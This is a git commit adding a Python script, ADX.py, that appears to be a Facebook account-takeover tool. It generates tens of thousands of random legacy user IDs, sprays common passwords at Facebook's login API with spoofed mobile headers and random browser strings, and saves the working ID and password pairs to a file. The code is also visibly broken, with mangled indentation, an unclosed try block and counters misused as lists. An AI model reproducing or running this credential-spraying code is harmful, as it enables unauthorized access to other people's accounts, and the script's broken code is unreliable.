857be42bc5fc21e8791aaca8866ae06d79dc04f0
Emmanuel Olamide ogundare <ogundareemmanuelolamide123@gmail.com>
2026-03-01 22:06:18 +0100

    Add files via upload

---
+++ ADX.py
@@ -0,0 +1,221 @@
+# irreducible cflow, using cdg fallback
+global cps
+global twf
+global loop
+global oks
+import requests,bs4,json,uuid,os,sys,random,datetime,time,re,urllib3,base64,string,platform,httpx,mechanize,rich,json,subprocess
+try:
+	from time import sleep
+	from bs4 import BeautifulSoup as sop
+	from datetime import datetime
+	from random import randint as rr
+	from random import choice as rc
+	from string import digits as digits
+	from os import system as cmd
+	from concurrent.futures import ThreadPoolExecutor as tred 
+	os.system('pip install rich')
+	os.system('pip install requests')
+	os.system('pip install bs4')
+	sys.stdout.write('AXT')
+	def ___uax___():
+    aV=str(random.choice(range(10,20)))
+    A=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
+    bV=str(random.choice(range(1,36)))
+    bx=str(random.choice(range(34,38)))
+    bz=f"5{bx}.{bV}"
+    B=f"Mozilla/5.0 (Windows NT {str(random.choice(range(5,7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{bz}"
+    cV=str(random.choice(range(1,36)))
+    cx=str(random.choice(range(34,38)))
+    cz=f"5{cx}.{cV}"
+    C=f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2','1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{cz}"
+    D=f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1,7120)))}.0 Safari/537.36"
+    return random.choice([A,B,C,D])
+	os.system('https://chat.whatsapp.com/Lje6yDaKThu7OEQrfMTbps?mode=gi_t')
+	##-------------(Basic colors)-------------------
+yellow = "\033[1;33m"
+black = "\033[1;90m"
+red = "\033[1;91m"
+green = "\033[1;32m"
+blue = "\033[1;34m"
+purple = "\033[1;35m"
+cyan = "\033[1;36m"
+r_cyan = "\033[38;5;122m"
+r_purple = "\033[38;5;147m"
+r_green = "\033[38;5;112m"
+white = "\033[0;97m"
+reset = '\x1b[0m'
+pink = "\x1b[38;5;205m"
+brown = "\x1b[38;5;208m"
+colors = ("\033[0;30m", "\033[1;30m", "\033[0;31m", "\033[1;31m", "\033[0;32m", "\033[1;32m",
+    "\033[0;92m", "\033[1;92m", "\033[1;93m", "\033[1;94m", "\033[1;95m", "\033[1;96m",
+    "\033[0;33m", "\033[1;33m", "\033[0;34m", "\033[1;34m", "\033[0;35m", "\033[1;35m",
+    "\033[0;36m", "\033[1;36m", "\033[0;37m", "\033[1;37m", "\033[1;90m", "\033[0;91m",
+    "\033[1;91m", "\033[0;92m", "\033[1;93m", "\033[0;94m", "\033[1;94m", "\033[0;95m",
+    "\033[1;95m", "\033[0;96m", "\033[1;96m", "\033[0;97m", "\033[0;100m", "\033[1;100m",
+    "\033[0;101m", "\033[1;101m", "\033[0;102m", "\033[1;102m", "\033[0;104m", "\033[1;104m",
+    "\033[0;105m", "\033[1;105m", "\033[0;106m", "\033[1;106m")
+#---------------------------| Loop |---------------------------#
+id,id2,loop,ok,cp=[],[],0,0,0;user=[];total_hits = 0
+#---------------------------| Linex |---------------------------#
+def clear():os.system('clear');print(logo)
+def linex():print(f'{black}⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯{white}')
+#---------------------------| Logo |---------------------------#
+logo=("""\033[1;47m    _____                                        _____          
+         /\    \                 ______               /\    \         
+        /::\    \               |::|   |             /::\    \        
+       /::::\    \              |::|   |             \:::\    \       
+      /::::::\    \             |::|   |              \:::\    \      
+     /:::/\:::\    \            |::|   |               \:::\    \     
+    /:::/__\:::\    \           |::|   |                \:::\    \    
+   /::::\   \:::\    \          |::|   |                /::::\    \   
+  /::::::\   \:::\    \         |::|   |               /::::::\    \  
+ /:::/\:::\   \:::\    \  ______|::|___|___ ____      /:::/\:::\    \ 
+/:::/  \:::\   \:::\____\|:::::::::::::::::|    |    /:::/  \:::\____\
+\::/    \:::\  /:::/    /|:::::::::::::::::|____|   /:::/    \::/    /
+ \/____/ \:::\/:::/    /  ~~~~~~|::|~~~|~~~        /:::/    / \/____/ 
+          \::::::/    /         |::|   |          /:::/    /          
+           \::::/    /          |::|   |         /:::/    /           
+           /:::/    /           |::|   |         \::/    /            
+          /:::/    /            |::|   |          \/____/             
+         /:::/    /             |::|   |                              
+        /:::/    /              |::|   |                              
+        \::/    /               |::|___|                              
+         \/____/                 ~~                                   
+                                                      \033[0m""")
+# -------------(CHECK ID CREATION YEAR)--------------
+def creationyear(uid):
+    if len(uid) == 15:
+        if uid[:10] in ['1000000000']:
+            AXT= '2009'
+        elif uid[:9] in ['100000000']:
+            AXT = '2009'
+        elif uid[:8] in ['10000000']:
+            AXT= '2009'
+        elif uid[:7] in ['1000000', '1000001', '1000002', '1000003', '1000004', '1000005']:
+             AXT = '2009'
+        elif uid[:7] in ['1000006', '1000007', '1000008', '1000009']:
+             AXT = '2010'
+        elif uid[:6] in ['100001']:
+             AXT = '2010'
+        elif uid[:6] in ['100002', '100003']:
+             AXT = '2011'
+        elif uid[:6] in ['100004']:
+             AXT = '2012'
+        elif uid[:6] in ['100005', '100006']:
+             AXT = '2013'
+        elif uid[:6] in ['100007', '100008']:
+             AXT = '2014'
+        elif uid[:6] in ['100009']:
+             AXT = '2015'
+        elif uid[:5] in ['10001']:
+            AXT = '2016'
+        elif uid[:5] in ['10002']:
+             AXT= '2017'
+        elif uid[:5] in ['10003']:
+             AXT = '2018'
+        elif uid[:5] in ['10004']:
+             AXT = '2019'
+        elif uid[:5] in ['10005']:
+            AXT = '2020'
+        elif uid[:5] in ['10006']:
+            AXT = '2021'
+        elif uid[:5] in ['10009']:
+           AXT = '2023'
+        elif uid[:5] in ['10007', '10008']:
+             AXT= '2022'
+        else:
+            AXT = ''
+    elif len(uid) in [9, 10]:
+         AXT= '2008'
+    elif len(uid) == 8:
+         AXTk = '2007'
+    elif len(uid) == 7:
+         AXT = '2006'
+    elif len(uid) == 14 and uid[:2] in ['61']:
+         AXT= '2024'
+    else:
+       AXT = ''
+    return AXT
+        	
+#---------------------------[ MAIN MENU ]---------------------------#
+def WEHSHI________():
+    clear()
+    print(f"\033[1;90m[\033[1;97m1\033[1;90m]\033[0;97m OLD 2009 & 2010 CLONING")
+    print(f"\033[1;90m[\033[1;97m2\033[1;90m]\033[0;97m OLD 2011 to 2014 CLONING")
+    print(f"\x1b[1;90m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\033[0;97m") 
+    option = input(f"\033[1;90m[\033[1;97m?\033[1;90m]\033[0;97m Enter Your Choice: ")
+    if option == "1":
+        ____old2009___()
+    elif option == "2":
+        _____old2011_____()
+    else:
+        print(f"{red}[!] Invalid choice! Exiting..."); exit()
+
+#---------------------------[ 2009-2010 CLONING ]---------------------------#
+def ____old2009___():
+    clear()
+    limit = str(random.randint(30000, 70000))
+    for _ in range(int(limit)):
+        nmp = ''.join(random.choice(digits) for _ in range(9))
+        user.append(nmp)
+
+    with tred(max_workers=30) as habibx:
+        clear()
+        tl = str(len(user))
+        print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[0;97m TOTAL IDS : \033[92m{tl}")
+        print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[0;97m USE 1.1.1.1 VPN FOR BEST RESULT")
+        linex()
+        for love in user:
+            uid = "100000" + love
+            pas = ['123456', '1234567', '12345678', '123456789']
+            habibx.submit(____old____, uid, pas, tl)
+
+    print('');linex();print(f"\n{green} Cloning Session Complete")
+    print(f"{white}➤ Total OK: {green}{len(ok)}")
+    print(f"{white}➤ Total CP: {red}{len(cp)}")
+    linex()
+    exit()
+#---------------------------[ 2011-2014 CLONING ]---------------------------#
+def _____old2011_____():
+    clear()
+    limit = str(random.randint(30000, 70000))
+    for _ in range(int(limit)):
+        nmp = ''.join(random.choice(digits) for _ in range(10))
+        user.append(nmp)
+
+    with tred(max_workers=30) as habibx:
+        clear()
+        tl = str(len(user))
+        print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[0;97m TOTAL IDS : \033[92m{tl}")
+        print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[0;97m USE 1.1.1.1 VPN FOR BEST RESULT")
+        linex()
+        for love in user:
+            uid = "10000" + love
+            pas = ['123456', '1234567', '12345678', '123456789']
+            habibx.submit(____old____, uid, pas, tl)
+
+    print('');linex();print(f"\n{green} Cloning Session Complete")
+    print(f"{white}➤ Total OK: {green}{len(ok)}")
+    print(f"{white}➤ Total CP: {red}{len(cp)}")
+    linex()
+    exit()
+def ____old____(uid,pas,tl):
+    global loop,ok,total_hits
+    sys.stdout.write('AXT')
+    try:
+        for ps in pas:
+            with requests.Session() as session:
+                headers={'x-fb-connection-bandwidth': str(rr(20000000,29999999)),'x-fb-sim-hni': str(rr(20000,40000)),'x-fb-net-hni': str(rr(20000,40000)),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent': ___uax___(),'content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
+            po=session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(ps)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true",headers=headers).json()
+            if "Please Confirm Email" in str(po):
+                print(f"\r\033[1;92m[YOUNIS-OK🔥] {uid} ● {ps}\033[1;97m =\033[1;92m {creationyear(uid)}")
+                open("/sdcard/OLD-OK.txt",'a').write(str(uid)+"|"+str(ps)+"\n");ok+=1
+                break
+            elif "session_key" in po:
+                print(f"\r\033[1;92m[YOUNIS-OK🔥] {uid} ● {ps}\033[1;97m =\033[1;92m {creationyear(uid)}")
+                open("/sdcard/OLD-OK.txt",'a').write(str(uid)+"|"+str(ps)+"\n");ok+=1
+                break
+            else:pass
+        loop+=1
+    except Exception as e:pass
+	WEHSHI________()
